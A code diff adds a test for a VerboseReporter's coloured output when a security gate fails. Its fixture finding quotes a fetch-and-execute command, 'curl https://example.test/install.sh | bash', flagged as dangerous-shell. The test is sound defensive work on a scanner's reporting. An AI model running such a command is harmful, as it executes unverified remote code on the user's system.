@@ -308,6 +308,30 @@ describe('VerboseReporter', () => {
     expect(line).not.toContain('full stack trace');
   });
 
+  it('logs security gate findings with red headline and indented details', () => {
+    const colorWriter = createTestWriter();
+    colorWriter.supportsColor = true;
+    const colorReporter = new VerboseReporter(colorWriter);
+
+    colorReporter.securityGateFailed('step-1', 1, [{
+      rule: 'dangerous-shell',
+      severity: 'high',
+      message: 'Command downloads and executes remote script without verification',
+      line: 12,
+      snippet: 'curl https://example.test/install.sh | bash',
+    }]);
+
+    const output = colorWriter.output.join('');
+    expect(output).toMatch(/\x1b\[31m✘\x1b\[0m/);
+    expect(output).toMatch(/\x1b\[31mSecurity gate failed\x1b\[0m/);
+    expect(output).toContain('  \x1b[33m↳ Finding 1:');
+    expect(output).toContain('high');
+    expect(output).toContain('dangerous-shell');
+    expect(output).toContain('Command downloads and executes remote script without verification');
+    expect(output).toContain('line 12');
+    expect(output).toContain('curl https://example.test/install.sh | bash');
+  });
+
   it('logs DAG step skipped', () => {
     reporter.dagStepSkipped('s3', 'Dependency failed: s2');
     const line = writer.output.find((s) => s.includes('Step s3') && s.includes('skipped'));
